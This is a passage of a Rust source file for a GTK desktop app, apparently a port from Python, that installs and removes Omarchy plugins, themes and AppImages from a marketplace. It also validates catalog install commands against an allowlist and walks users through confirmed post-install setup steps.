//! UI section `store_actions` (port of `app.py` lines 3153-3675):
//! install/remove from the store, setup after install, themes, AppImages.

use std::cell::Cell;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use adw::prelude::*;
use gtk::{gio, glib, pango};
use serde_json::{json, Value};

use crate::history;
use crate::i18n::tr;
use crate::inventory;
use crate::plugin_setup::{self as setup_mod, SetupPlan};
use crate::plugins as plugins_mod;
use crate::shortcuts;
use crate::store::{self as store_mod, Plugin};
use crate::tasks::{self, LogFn, Step, StepFn};
use crate::ui::shell::{name, PluginItem, SwitchGuard, WeakWin, Win, INSTALL_ICON};
use crate::util;
use crate::xdg;

/// This section's own state. Every attribute these methods touch
/// (`store_model`, `_plugins`, `_thumb_pool`, `toasts`, `hero`) belongs to
/// another section or the shell, so there is nothing of its own to keep.
#[derive(Default)]
pub struct State {}

// ---- the decisions, apart from the dialogs that carry them ------------------
//
// Each method below builds its confirmation from these, so the tests can check
// what would be asked and what would run without a display.

/// `shlex.split(p.install_cmd)`, plus `--yes` where the command takes it.
/// Err where `shlex.split` raises (an unclosed quote), with its message.
/// `x?` for a handler that returns nothing: what the Python raises there
/// (a listing property of the wrong type, say) ends the handler, logged.
macro_rules! or_log {
    ($e:expr) => {
        match $e {
            Ok(v) => v,
            Err(e) => {
                eprintln!("almanac: {e}");
                return;
            }
        }
    };
}

pub fn install_argv(install_cmd: &str) -> Result<Vec<String>, String> {
    let mut argv = shlex_split(install_cmd)?;
    catalog_argv_allowed(&argv)?;
    // `plugin add` has a prompt to skip; `plugin enable` does not take the
    // flag at all, so appending it blindly would break the built-ins.
    if argv.iter().take(3).any(|a| a == "add") && !argv.iter().any(|a| a == "--yes") {
        argv.push("--yes".to_string());
    }
    Ok(argv)
}

/// Refuse an install command from a marketplace listing unless it has one
/// of the shapes the listings actually use: `omarchy plugin add <https URL>`
/// (with `--enable` and `--yes`, each at most once) and `omarchy plugin
/// enable <plugin id>`. The catalog comes from a remote site and its command
/// runs with the user's permissions; a command of any other shape -- a
/// different program, a URL that is an option, a scheme other than https --
/// is not run. The message shows what was refused, quoted so that a newline
/// or a quote in it is seen.
pub fn catalog_argv_allowed(argv: &[String]) -> Result<(), String> {
    let words: Vec<&str> = argv.iter().map(String::as_str).collect();
    let ok = match words.as_slice() {
        ["omarchy", "plugin", "add", url, flags @ ..] => {
            is_https_url(url)
                && flags.iter().all(|f| matches!(*f, "--enable" | "--yes"))
                && flags.iter().enumerate().all(|(i, f)| !flags[..i].contains(f))
        }
        ["omarchy", "plugin", "enable", id] => is_plugin_id(id),
        _ => false,
    };
    if ok {
        return Ok(());
    }
    Err(format!(
        "its install command is not one Almanac runs from a marketplace (only \
         “omarchy plugin add <https URL>” and “omarchy plugin enable <id>”): {}",
        shown_argv(argv)
    ))
}

/// An https URL, and only that: a scheme other than https (git's `ext::`,
/// `file://`, plain http), whitespace or a control character, or anything
/// URLs do not hold, is refused.
pub fn is_https_url(s: &str) -> bool {
    s.strip_prefix("https://").is_some_and(|rest| {
        !rest.is_empty()
            && !rest.starts_with('/')
            && rest.chars().all(|c| c.is_ascii_alphanumeric() || "-._~:/?#[]@!$&'()*+,;=%".contains(c))
    })
}

/// A plugin id as the catalog's own built-ins have them (`omarchy.clock`):
/// letters, digits, `.`, `_`, `-`, not starting like an option or a path.
fn is_plugin_id(s: &str) -> bool {
    !s.is_empty()
        && !s.starts_with(['-', '.'])
        && s.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
}

/// An argv as a shell would read it back, each word quoted where it needs
/// it, with control characters (a newline that would push the rest of the
/// command out of sight) shown as escapes.
pub fn shown_argv(argv: &[String]) -> String {
    argv.iter()
        .map(|a| {
            let q = crate::store::shlex_quote(a);
            if q.chars().any(char::is_control) {
                q.chars().flat_map(|c| if c.is_control() { c.escape_default().collect::<Vec<_>>() } else { vec![c] }).collect()
            } else {
                q
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// `shlex.split(s)` (posix, `whitespace_split=True`, no comment characters):
/// the same state machine as Python's `shlex.shlex`. Errs with Python's
/// message on an open quote or a trailing backslash.
fn shlex_split(s: &str) -> Result<Vec<String>, String> {
    const WS: &str = " \t\r\n";
    let mut out = Vec::new();
    let mut token = String::new();
    let mut quoted = false;
    // ' ' = between words, 'a' = in a word, '\'' / '"' = in quotes, '\\' = escape
    let mut state = ' ';
    let mut escaped_state = 'a';
    let mut chars = s.chars();
    loop {
        let next = chars.next();
        match state {
            ' ' => match next {
                None => break,
                Some(c) if WS.contains(c) => {
                    if !token.is_empty() || quoted {
                        out.push(std::mem::take(&mut token));
                        quoted = false;
                    }
                }
                Some('\\') => {
                    escaped_state = 'a';
                    state = '\\';
                }
                Some(c) if c == '\'' || c == '"' => {
                    quoted = true;
                    state = c;
                }
                Some(c) => {
                    token.push(c);
                    state = 'a';
                }
            },
            '\'' | '"' => match next {
                None => return Err("No closing quotation".to_string()),
                Some(c) if c == state => state = 'a',
                Some('\\') if state == '"' => {
                    escaped_state = state;
                    state = '\\';
                }
                Some(c) => token.push(c),
            },
            '\\' => match next {
                None => return Err("No escaped character".to_string()),
                Some(c) => {
                    if (escaped_state == '\'' || escaped_state == '"') && c != '\\' && c != escaped_state {
                        token.push('\\');
                    }
                    token.push(c);
                    state = escaped_state;
                }
            },
            _ => match next {
                None => break,
                Some(c) if WS.contains(c) => {
                    state = ' ';
                    if !token.is_empty() || quoted {
                        out.push(std::mem::take(&mut token));
                        quoted = false;
                    }
                }
                Some(c) if c == '\'' || c == '"' => {
                    quoted = true;
                    state = c;
                }
                Some('\\') => {
                    escaped_state = 'a';
                    state = '\\';
                }
                Some(c) => token.push(c),
            },
        }
    }
    if !token.is_empty() || quoted {
        out.push(token);
    }
    Ok(out)
}

/// The body of the plugin install confirmation.
pub fn install_body(p: &Plugin) -> String {
    let mut body = tr("Omarchy shell plugins run inside the shell process with your \
                       permissions — there is no sandbox. Install what you trust.");
    if p.needs_setup {
        body += "\n\n";
        body += &tr("Its author lists setup beyond the install — packages, a build \
                     step or a sign-in. Once it is installed, Almanac shows you each \
                     step from its README before running any of it.");
    }
    body
}

/// The detail (provenance and the command) of the plugin install confirmation.
///
/// `Err` where a listing property raises.
pub fn install_detail(p: &Plugin, argv: &[String]) -> Result<String, String> {
    let t = p.try_trust()?;
    let licence = if p.license.is_empty() { "unstated" } else { p.license.as_str() };
    Ok(format!(
        "Publisher   {}\nProvenance  {} — {}\nLicence     {}\nListed by   {}\n\n$ {}",
        p.try_publisher()?,
        t.label,
        t.why,
        licence,
        p.try_market_name_text()?,
        shown_argv(argv)
    ))
}

/// The steps of a plugin removal: the plugin, then its shortcut.
pub fn plugin_remove_steps(p: &Plugin) -> Vec<Step> {
    vec![
        Step::argv(
            format!("Removing {}", p.name),
            vec!["omarchy".into(), "plugin".into(), "remove".into(), p.id.clone(), "--yes".into()],
        ),
        Win::forget_shortcut(&p.id),
    ]
}

/// `p.install_cmd.split()[-1]`: the theme's URL. None where the Python's
/// index raises (an empty command).
pub fn theme_url(install_cmd: &str) -> Option<String> {
    install_cmd.split(py_isspace).filter(|s| !s.is_empty()).last().map(str::to_string)
}

/// `str.isspace()` on one character: Unicode White_Space, plus the four
/// separators \x1c-\x1f that Python's `str.split()` also splits on.
fn py_isspace(c: char) -> bool {
    c.is_whitespace() || ('\x1c'..='\x1f').contains(&c)
}

pub fn theme_install_argv(url: &str) -> Vec<String> {
    vec!["omarchy".into(), "theme".into(), "install".into(), url.to_string()]
}

pub fn theme_set_argv(name: &str) -> Vec<String> {
    vec!["omarchy".into(), "theme".into(), "set".into(), name.to_string()]
}

pub fn theme_remove_argv(name: &str) -> Vec<String> {
    vec!["omarchy".into(), "theme".into(), "remove".into(), name.to_string()]
}

/// Why a theme cannot be removed (it ships with Omarchy), or None.
pub fn theme_removal_refused(p: &Plugin) -> Option<String> {
    if p.built_in {
        return Some(format!("{} ships with Omarchy and cannot be removed", p.name));
    }
    None
}

/// `Path(inventory.REGISTRY).parent / "apps"`. Read from
/// `inventory::registry()` each time, as `fetch_appimage`'s registry write
/// is, so the AppImage and its record always land in the same tree.
fn store_apps_dir() -> PathBuf {
    let reg = inventory::registry();
    reg.parent().map(Path::to_path_buf).unwrap_or_default().join("apps")
}

/// Where a store AppImage is kept: beside the registry, in `apps/`.
pub fn store_appimage_path(p: &Plugin) -> PathBuf {
    py_join(&store_apps_dir(), &format!("{}.AppImage", p.id))
}

/// The registry record a store AppImage is written with.
///
/// `Err` where `p.owner` raises.
pub fn appimage_record(p: &Plugin, dest: &Path) -> Result<Value, String> {
    let owner = p.try_owner()?;
    Ok(json!({
        "name": p.id, "path": dest.to_string_lossy(), "version": p.version,
        "description": p.description, "url": p.repo,
        "latest": {}, "checked_at": 0,
        // Tracked the same way a hand-added AppImage is, so the existing
        // update check picks it up without knowing about marketplaces.
        "update_spec": {"kind": "github", "owner": owner,
                        "repo": p.id, "release": "latest",
                        "pattern": format!("{}-*-linux-x86_64.AppImage", p.id)},
    }))
}

/// `s[:n]` on characters, as Python slices a str.
fn head_chars(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

/// `folder / name` as pathlib does it: '.' components and trailing or
/// doubled slashes are dropped (`root / "."` is root, `root / "x/"` is
/// root/x, `root / ""` is root), and an absolute name replaces the folder.
fn py_join(folder: &Path, name: &str) -> PathBuf {
    use std::path::Component;
    let mut out: PathBuf = folder.components().collect();
    for comp in Path::new(name).components() {
        if comp != Component::CurDir {
            out.push(comp);
        }
    }
    out
}

/// Python's `repr(str)`, for the file names in OSError messages.
fn py_repr(s: &str) -> String {
    let quote = if s.contains('\'') && !s.contains('"') { '"' } else { '\'' };
    let mut out = String::from(quote);
    for c in s.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c == quote => {
                out.push('\\');
                out.push(c);
            }
            c if (c as u32) < 0x20 || c as u32 == 0x7f => out.push_str(&format!("\\x{:02x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push(quote);
    out
}

/// `str(OSError)` with a filename: `[Errno 17] File exists: '/path'`.
fn py_os_error(e: &std::io::Error, path: &Path) -> String {
    let Some(code) = e.raw_os_error() else { return e.to_string() };
    let text = e.to_string();
    let strerror = text.strip_suffix(&format!(" (os error {code})")).unwrap_or(&text);
    format!("[Errno {code}] {strerror}: {}", py_repr(&path.to_string_lossy()))
}

/// The OSError subclass Python raises for an errno, for the logged line.
fn py_os_error_class(e: &std::io::Error) -> &'static str {
    match e.raw_os_error() {
        Some(libc::ENOENT) => "FileNotFoundError",
        Some(libc::EACCES | libc::EPERM) => "PermissionError",
        Some(libc::EEXIST) => "FileExistsError",
        Some(libc::ENOTDIR) => "NotADirectoryError",
        Some(libc::EISDIR) => "IsADirectoryError",
        _ => "OSError",
    }
}

/// `path.mkdir(parents=True, exist_ok=True)`, step for step as pathlib does
/// it, so the error names the same folder Python's does.
fn py_mkdir_parents(path: &Path) -> Result<(), String> {
    match std::fs::create_dir(path) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            let parent = path.parent().filter(|q| *q != path && !q.as_os_str().is_empty());
            let Some(parent) = parent else { return Err(py_os_error(&e, path)) };
            py_mkdir_parents(parent)?;
            match std::fs::create_dir(path) {
                Ok(()) => Ok(()),
                Err(e) if e.kind() != std::io::ErrorKind::NotFound && path.is_dir() => Ok(()),
                Err(e) => Err(py_os_error(&e, path)),
            }
        }
        Err(_) if path.is_dir() => Ok(()),
        Err(e) => Err(py_os_error(&e, path)),
    }
}

/// `reg[p.id] = {...}` on whatever `inventory._load_registry()` returned:
/// `json.loads` of the file, or `{}` where it cannot be read or parsed.
/// Err with Python's TypeError where the JSON is not an object, so the step
/// fails and the file is left alone.
fn registry_with(p: &Plugin, dest: &Path) -> Result<serde_json::Map<String, Value>, String> {
    let mut reg = match util::read_json(&inventory::registry()) {
        None => serde_json::Map::new(),
        Some(Value::Object(m)) => m,
        Some(Value::Array(_)) => return Err("list indices must be integers or slices, not str".into()),
        Some(other) => {
            let kind = match other {
                Value::String(_) => "str",
                Value::Number(ref n) if n.is_f64() => "float",
                Value::Number(_) => "int",
                Value::Bool(_) => "bool",
                _ => "NoneType",
            };
            return Err(format!("'{kind}' object does not support item assignment"));
        }
    };
    reg.insert(p.id.clone(), appimage_record(p, dest).map_err(|e| crate::ui::shell::exc_str(&e))?);
    Ok(reg)
}

/// `subprocess.Popen(argv, start_new_session=True)`: setsid() in the child,
/// so it leaves Almanac's session and controlling terminal. The child is
/// reaped by GLib's child watch, as Popen's finaliser would.
fn popen_new_session(argv: &[String]) -> std::io::Result<()> {
    if argv.is_empty() {
        return Err(std::io::Error::from_raw_os_error(libc::ENOENT));
    }
    let launcher = gio::SubprocessLauncher::new(gio::SubprocessFlags::STDIN_INHERIT);
    launcher.set_child_setup(|| {
        let _ = rustix::process::setsid();
    });
    let args: Vec<&std::ffi::OsStr> = argv.iter().map(std::ffi::OsStr::new).collect();
    launcher.spawn(&args).map(drop).map_err(|e| spawn_errno(&e))
}

/// The `G_SPAWN_ERROR` domain, read back as the errno it was made from.
#[derive(Clone, Copy)]
struct SpawnCode(i32);

impl glib::error::ErrorDomain for SpawnCode {
    fn domain() -> glib::Quark {
        glib::Quark::from_str("g-exec-error-quark")
    }
    fn code(self) -> i32 {
        self.0
    }
    fn from(code: i32) -> Option<Self> {
        Some(SpawnCode(code))
    }
}

/// The errno behind a GLib spawn error, so it is reported as Popen's OSError.
fn spawn_errno(e: &glib::Error) -> std::io::Error {
    use glib::ffi as g;
    let Some(SpawnCode(code)) = e.kind::<SpawnCode>() else {
        return std::io::Error::other(e.message().to_string());
    };
    let errno = match code {
        g::G_SPAWN_ERROR_ACCES => libc::EACCES,
        g::G_SPAWN_ERROR_PERM => libc::EPERM,
        g::G_SPAWN_ERROR_TOO_BIG => libc::E2BIG,
        g::G_SPAWN_ERROR_NOEXEC => libc::ENOEXEC,
        g::G_SPAWN_ERROR_NAMETOOLONG => libc::ENAMETOOLONG,
        g::G_SPAWN_ERROR_NOENT => libc::ENOENT,
        g::G_SPAWN_ERROR_NOMEM => libc::ENOMEM,
        g::G_SPAWN_ERROR_NOTDIR => libc::ENOTDIR,
        g::G_SPAWN_ERROR_LOOP => libc::ELOOP,
        g::G_SPAWN_ERROR_TXTBUSY => libc::ETXTBSY,
        g::G_SPAWN_ERROR_IO => libc::EIO,
        g::G_SPAWN_ERROR_NFILE => libc::ENFILE,
        g::G_SPAWN_ERROR_MFILE => libc::EMFILE,
        g::G_SPAWN_ERROR_INVAL => libc::EINVAL,
        g::G_SPAWN_ERROR_ISDIR => libc::EISDIR,
        g::G_SPAWN_ERROR_LIBBAD => libc::ELIBBAD,
        _ => return std::io::Error::other(e.message().to_string()),
    };
    std::io::Error::from_raw_os_error(errno)
}

// ---- the flows, over what they need from the window ------------------------
//
// The Python tests run `on_plugin_install` / `on_plugin_remove` unbound against
// a stub window with `tasks.confirm` and `tasks.run` mocked. `Host` is that
// seam: the window implements it for real, the tests with a recorder.

/// What the store flows need from the window.
pub trait Host: Clone + 'static {
    fn say(&self, message: &str, timeout: u32);
    /// `tasks.confirm(self, heading, body, detail, action, destructive, on_yes)`.
    fn confirm(&self, heading: &str, body: &str, detail: &str, action: &str, destructive: bool, on_yes: Box<dyn Fn()>);
    /// `tasks.run(self, title, steps, on_done)`.
    fn run(&self, title: &str, steps: Vec<Step>, on_done: tasks::OnDone);
    /// `_store_after`. False where the Python raises out of it.
    fn store_after(&self, ok: bool, p: &Plugin, verb: &str) -> bool;
    fn offer_setup(&self, p: &Plugin);
    fn theme_installed(&self, ok: bool, p: &Plugin);
    fn apply_theme_now(&self, p: &Plugin);
    fn install_store_appimage(&self, p: &Plugin);
    fn remove_store_appimage(&self, p: &Plugin);
}

impl Host for WeakWin {
    fn say(&self, message: &str, timeout: u32) {
        if let Some(win) = self.upgrade() {
            win.say(message, timeout);
        }
    }
    fn confirm(&self, heading: &str, body: &str, detail: &str, action: &str, destructive: bool, on_yes: Box<dyn Fn()>) {
        if let Some(win) = self.upgrade() {
            tasks::confirm(&win.window, heading, body, detail, action, destructive, on_yes);
        }
    }
    fn run(&self, title: &str, steps: Vec<Step>, on_done: tasks::OnDone) {
        if let Some(win) = self.upgrade() {
            tasks::run(&win.window, title, steps, Some(on_done));
        }
    }
    fn store_after(&self, ok: bool, p: &Plugin, verb: &str) -> bool {
        self.upgrade().is_some_and(|win| win.store_after(ok, p, verb))
    }
    fn offer_setup(&self, p: &Plugin) {
        if let Some(win) = self.upgrade() {
            win.offer_setup(p);
        }
    }
    fn theme_installed(&self, ok: bool, p: &Plugin) {
        if let Some(win) = self.upgrade() {
            win.theme_installed(ok, p);
        }
    }
    fn apply_theme_now(&self, p: &Plugin) {
        if let Some(win) = self.upgrade() {
            win.apply_theme_now(p);
        }
    }
    fn install_store_appimage(&self, p: &Plugin) {
        if let Some(win) = self.upgrade() {
            win.install_store_appimage(p);
        }
    }
    fn remove_store_appimage(&self, p: &Plugin) {
        if let Some(win) = self.upgrade() {
            win.remove_store_appimage(p);
        }
    }
}

/// `on_plugin_install`: install from the store, without leaving the app.
pub fn plugin_install<H: Host>(h: &H, p: &Plugin) {
    if p.install_kind == "appimage" {
        h.install_store_appimage(p);
        return;
    }
    if p.install_kind == "theme" {
        theme_install(h, p);
        return;
    }

    let argv = match install_argv(&p.install_cmd) {
        Ok(argv) => argv,
        // A command that does not parse (shlex.split raised), or is not one
        // a listing may run: nothing is asked or run, and the user is told.
        Err(e) => {
            eprintln!("almanac: ValueError: {e}");
            h.say(&format!("{} was not installed: {e}", p.name), 10);
            return;
        }
    };
    let detail = or_log!(install_detail(p, &argv));
    let body = install_body(p);

    let (host, p) = (h.clone(), p.clone());
    h.confirm(
        &format!("Install {}?", p.name),
        &body,
        &detail,
        &tr("Install"),
        false,
        Box::new(move || {
            let (after_h, after_p) = (host.clone(), p.clone());
            let after: tasks::OnDone = Box::new(move |ok| {
                // `_store_after` raising ends `after` there, before setup.
                if !after_h.store_after(ok, &after_p, "installed") {
                    return;
                }
                if ok && after_p.needs_setup {
                    after_h.offer_setup(&after_p);
                }
            });
            host.run(
                &format!("Installing {}", p.name),
                vec![Step::argv(format!("Installing {}", p.name), argv.clone())],
                after,
            );
        }),
    );
}

/// `on_plugin_remove`: remove, with the command that kind of entry actually uses.
pub fn plugin_remove<H: Host>(h: &H, p: &Plugin) {
    if p.install_kind == "appimage" {
        h.remove_store_appimage(p);
        return;
    }
    if p.install_kind == "theme" {
        theme_remove(h, p);
        return;
    }
    let (host, p) = (h.clone(), p.clone());
    h.confirm(
        &format!("Remove {}?", p.name),
        "The plugin and its cloned repository are deleted from \
         ~/.config/omarchy/plugins.",
        &format!("$ omarchy plugin remove {} --yes", p.id),
        &tr("Remove"),
        true,
        Box::new(move || {
            let (after_h, after_p) = (host.clone(), p.clone());
            host.run(
                &format!("Removing {}", p.name),
                plugin_remove_steps(&p),
                Box::new(move |ok| {
                    after_h.store_after(ok, &after_p, "removed");
                }),
            );
        }),
    );
}

/// `_install_theme`: themes install and apply as two steps, so they are
/// offered as two.
///
/// `omarchy theme install` clones it; `omarchy theme set` switches the
/// whole desktop over. Doing both on one click would re-skin everything
/// the moment someone clicked Install out of curiosity.
pub fn theme_install<H: Host>(h: &H, p: &Plugin) {
    if p.installed {
        h.apply_theme_now(p);
        return;
    }
    let Some(url) = theme_url(&p.install_cmd) else {
        // split()[-1] raised out of the signal handler: logged, nothing shown.
        eprintln!("almanac: IndexError: list index out of range");
        return;
    };
    // The theme catalog is remote too: `omarchy theme install` is only
    // handed an https URL (it clones it), never an option or another scheme.
    let words: Vec<&str> = p.install_cmd.split(py_isspace).filter(|s| !s.is_empty()).collect();
    if words.as_slice() != ["omarchy", "theme", "install", url.as_str()] || !is_https_url(&url) {
        h.say(
            &format!(
                "{} was not installed: its install command is not “omarchy theme install <https URL>”: {}",
                p.name,
                shown_argv(std::slice::from_ref(&p.install_cmd))
            ),
            10,
        );
        return;
    }
    let licence = if p.license.is_empty() { "unstated" } else { p.license.as_str() };
    let detail = format!(
        "Publisher  {}\nLicence    {}\nStars      {}\n\n$ {}",
        or_log!(p.try_publisher()),
        licence,
        p.stars,
        shown_argv(&theme_install_argv(&url))
    );
    let (host, p) = (h.clone(), p.clone());
    h.confirm(
        &format!("Install the {} theme?", p.name),
        &tr("The theme is cloned into ~/.config/omarchy/themes. Nothing \
             changes appearance until you apply it."),
        &detail,
        &tr("Install"),
        false,
        Box::new(move || {
            let (after_h, after_p) = (host.clone(), p.clone());
            host.run(
                &format!("Installing {}", p.name),
                vec![Step::argv(format!("Installing {}", p.name), theme_install_argv(&url))],
                Box::new(move |ok| after_h.theme_installed(ok, &after_p)),
            );
        }),
    );
}

/// `_remove_theme`.
pub fn theme_remove<H: Host>(h: &H, p: &Plugin) {
    if let Some(why) = theme_removal_refused(p) {
        h.say(&why, 6);
        return;
    }
    let (host, p) = (h.clone(), p.clone());
    h.confirm(
        &format!("Remove the {} theme?", p.name),
        &tr("Deletes the cloned theme from ~/.config/omarchy/themes. If it is \
             the theme you are wearing, Omarchy falls back to another one."),
        &format!("$ omarchy theme remove {}", p.name),
        &tr("Remove"),
        true,
        Box::new(move || {
            let (after_h, after_p) = (host.clone(), p.clone());
            host.run(
                &format!("Removing {}", p.name),
                vec![Step::argv(format!("Removing {}", p.name), theme_remove_argv(&p.name))],
                Box::new(move |ok| {
                    after_h.store_after(ok, &after_p, "removed");
                }),
            );
        }),
    );
}

impl Win {
    /// The catalogue's own copy of `p`, as it is now. The Python hands the
    /// same Plugin object around (the grid, the dialog, every callback), and
    /// `store_mod.annotate` updates it in place, so a handler made earlier
    /// sees `installed`, `enabled`, `local_version` and `built_in` as they are
    /// when it runs. Here the copies are looked up again in `_plugins`; one
    /// that is not there (the list was replaced) stays as it was.
    pub fn live(&self, p: &Plugin) -> Plugin {
        let Ok(sh) = self.shared.try_borrow() else { return p.clone() };
        sh.plugins
            .iter()
            .find(|q| q.id == p.id && q.market == p.market && q.install_kind == p.install_kind)
            .cloned()
            .unwrap_or_else(|| p.clone())
    }

    // ---- marketplace actions ---------------------------------------------
    pub fn on_card_activated(&self, position: u32) {
        let model = self.shared.borrow().store_model.clone();
        let Some(obj) = model.item(position) else { return };
        let plugin = PluginItem::of(&obj).map(|item| item.plugin.clone());
        if let Some(p) = plugin {
            self.show_plugin(&p);
        }
    }

    /// Install from the store, without leaving the app.
    pub fn on_plugin_install(&self, p: &Plugin) {
        plugin_install(&self.downgrade(), &self.live(p));
    }

    // ---- setup after install ----------------------------------------------
    /// Where `omarchy plugin add` put this plugin: named by manifest id.
    ///
    /// Err where the Python raises: a manifest whose JSON is not an object
    /// has no `.get`, and the AttributeError is not one of those caught.
    pub fn plugin_dir(&self, p: &Plugin) -> Result<Option<PathBuf>, String> {
        let root = py_join(&xdg::try_config_home()?, "omarchy/plugins");
        let direct = py_join(&root, &p.id);
        if direct.is_dir() {
            return Ok(Some(direct));
        }
        // root.glob("*/manifest.json"): pathlib's "*" matches dot-folders too.
        let Ok(entries) = std::fs::read_dir(&root) else { return Ok(None) };
        for entry in entries.flatten() {
            let folder = entry.path();
            let manifest = folder.join("manifest.json");
            if !manifest.exists() {
                continue;
            }
            let Ok(text) = std::fs::read_to_string(&manifest) else { continue };
            let Ok(data) = serde_json::from_str::<Value>(&text) else { continue };
            let Some(obj) = data.as_object() else {
                let kind = match data {
                    Value::Array(_) => "list",
                    Value::String(_) => "str",
                    Value::Number(ref n) if n.is_f64() => "float",
                    Value::Number(_) => "int",
                    Value::Bool(_) => "bool",
                    _ => "NoneType",
                };
                return Err(format!("AttributeError: '{kind}' object has no attribute 'get'"));
            };
            if obj.get("id").and_then(Value::as_str) == Some(p.id.as_str()) {
                return Ok(Some(folder));
            }
        }
        Ok(None)
    }

    /// Read the installed plugin's README and walk through its setup.
    pub fn offer_setup(&self, p: &Plugin) {
        let folder = match self.plugin_dir(p) {
            Ok(folder) => folder,
            // Raised out of the Python method: logged, nothing shown.
            Err(e) => {
                eprintln!("almanac: {e}");
                return;
            }
        };
        let Some(folder) = folder else {
            self.say(&format!("{}: installed, but its folder was not found", p.name), 5);
            return;
        };

        let w = self.downgrade();
        let p = p.clone();
        crate::ui::shell::spawn_bg(
            move || setup_mod::plan(&folder),
            move |plan| {
                // A README that cannot be read raised in the Python thread,
                // which then never reached idle_add: nothing is shown.
                let Ok(plan) = plan else { return };
                if let Some(win) = w.upgrade() {
                    win.show_setup(&p, &plan);
                }
            },
        );
    }

    pub fn show_setup(&self, p: &Plugin, plan: &SetupPlan) {
        if plan.empty() {
            self.say(&format!("{} installed — its README asks for nothing more", p.name), 5);
            return;
        }
        let body = if plan.automatable() {
            tr("From the plugin's README. Packages are installed by \
                Almanac; commands run in a terminal in the plugin's \
                folder, where you can watch them. Nothing runs until you \
                choose.")
        } else {
            tr("Nothing here can be done for you — these need you. The \
                README has the details.")
        };
        let dialog = adw::AlertDialog::new(Some(&format!("Finish setting up {}", p.name)), Some(&body));
        let buf = gtk::TextBuffer::new(None);
        buf.set_text(&setup_mod::describe(plan));
        let text = gtk::TextView::builder()
            .buffer(&buf)
            .editable(false)
            .monospace(true)
            .cursor_visible(false)
            .build();
        text.set_wrap_mode(gtk::WrapMode::WordChar);
        text.set_left_margin(8);
        text.set_right_margin(8);
        text.set_top_margin(8);
        text.set_bottom_margin(8);
        let scroll = gtk::ScrolledWindow::new();
        scroll.set_policy(gtk::PolicyType::Never, gtk::PolicyType::Automatic);
        scroll.set_min_content_height(170);
        scroll.set_max_content_height(340);
        scroll.set_child(Some(&text));
        scroll.add_css_class("card");
        dialog.set_extra_child(Some(&scroll));
        // hasattr(dialog, "set_prefer_wide_layout"): libadwaita 1.6 and later.
        if dialog.find_property("prefer-wide-layout").is_some() {
            dialog.set_property("prefer-wide-layout", true);
        }
        dialog.add_response("later", &tr("Later"));
        dialog.add_response("readme", &tr("Open README"));
        // A script too long to show in full can be read where it is.
        let cut = setup_mod::cut_scripts(plan);
        if !cut.is_empty() {
            dialog.add_response("script", &tr("Open the script"));
        }
        if plan.automatable() {
            dialog.add_response("run", &tr("Run setup"));
            dialog.set_response_appearance("run", adw::ResponseAppearance::Suggested);
        }
        dialog.set_default_response(Some("later"));
        dialog.set_close_response("later");

        let w = self.downgrade();
        let p = p.clone();
        let plan = plan.clone();
        dialog.connect_response(None, move |_d, resp| {
            let Some(win) = w.upgrade() else { return };
            if resp == "script" {
                if let Some(script) = cut.first() {
                    win.open_url(&gtk::gio::File::for_path(script).uri());
                }
            } else if resp == "readme" {
                let url = if !p.repo.is_empty() {
                    format!("{}#readme", p.repo)
                } else {
                    format!("file://{}", py_join(&plan.plugin_dir, &plan.readme).display())
                };
                win.open_url(&url);
            } else if resp == "run" {
                win.run_setup(&p, &plan);
            }
        });
        dialog.present(Some(&self.window));
    }

    pub fn run_setup(&self, p: &Plugin, plan: &SetupPlan) {
        let commands = {
            let w = self.downgrade();
            let p = p.clone();
            let plan = plan.clone();
            move || {
                if plan.commands.is_empty() {
                    return;
                }
                let script = setup_mod::terminal_script(&plan)
                    + "; echo; read -n1 -r -p 'Press any key to close'";
                let argv = xdg::terminal_argv(&["bash", "-lc", script.as_str()]);
                let Some(argv) = argv.filter(|a| !a.is_empty()) else {
                    if let Some(win) = w.upgrade() {
                        win.say(&tr("No terminal found to run the setup commands in"), 5);
                    }
                    return;
                };
                // Popen raising stops before the record: logged, as the
                // traceback out of the task callback is.
                if let Err(e) = popen_new_session(&argv) {
                    eprintln!("almanac: {}: {}", py_os_error_class(&e), py_os_error(&e, Path::new(&argv[0])));
                    return;
                }
                if let Err(e) = history::record_checked(
                    history::ALMANAC,
                    &format!("Setup commands run for {}", p.name),
                    "",
                    "",
                    &plan.commands,
                ) {
                    eprintln!("almanac: {e}");
                }
            }
        };

        if !plan.packages.is_empty() {
            let mut argv: Vec<String> = ["yay", "-S", "--needed", "--noconfirm", "--sudo", "pkexec"]
                .iter()
                .map(|s| (*s).to_string())
                .collect();
            argv.extend(plan.packages.iter().cloned());
            // What record raises ends `_run_setup` before the task starts.
            if let Err(e) = history::record_checked(
                history::ALMANAC,
                &format!("Setup packages for {}", p.name),
                "",
                "",
                &plan.packages,
            ) {
                eprintln!("almanac: {e}");
                return;
            }
            let steps = match self.snapshot_first(
                vec![Step::argv(tr("Installing what it needs"), argv)],
                &format!("setting up {}", p.name),
            ) {
                Ok(steps) => steps,
                Err(e) => {
                    eprintln!("almanac: {e}");
                    return;
                }
            };
            let w = self.downgrade();
            tasks::run(
                &self.window,
                &format!("Setting up {}", p.name),
                steps,
                Some(Box::new(move |ok| {
                    if let Some(win) = w.upgrade() {
                        win.after_pacman(ok);
                    }
                    if ok {
                        commands();
                    }
                })),
            );
        } else {
            commands();
        }
    }

    /// Remove, with the command that kind of entry actually uses.
    ///
    /// Three catalogues, three removal mechanisms. Dispatching on the kind
    /// rather than assuming `omarchy plugin remove` matters: run against a
    /// theme that command addresses something that does not exist.
    pub fn on_plugin_remove(&self, p: &Plugin) {
        plugin_remove(&self.downgrade(), &self.live(p));
    }

    // ---- store entries that are themes ----

    pub fn theme_installed(&self, ok: bool, p: &Plugin) {
        if !ok {
            self.say(&format!("{} was not installed", p.name), 8);
            return;
        }
        if !self.annotate_plugins() {
            return;
        }
        self.store_refresh();
        let toast = adw::Toast::builder()
            .title(format!("{} installed", p.name))
            .use_markup(false)
            .timeout(0)
            .build();
        toast.set_button_label(Some("Apply"));
        let w = self.downgrade();
        let p = p.clone();
        toast.connect_button_clicked(move |_| {
            if let Some(win) = w.upgrade() {
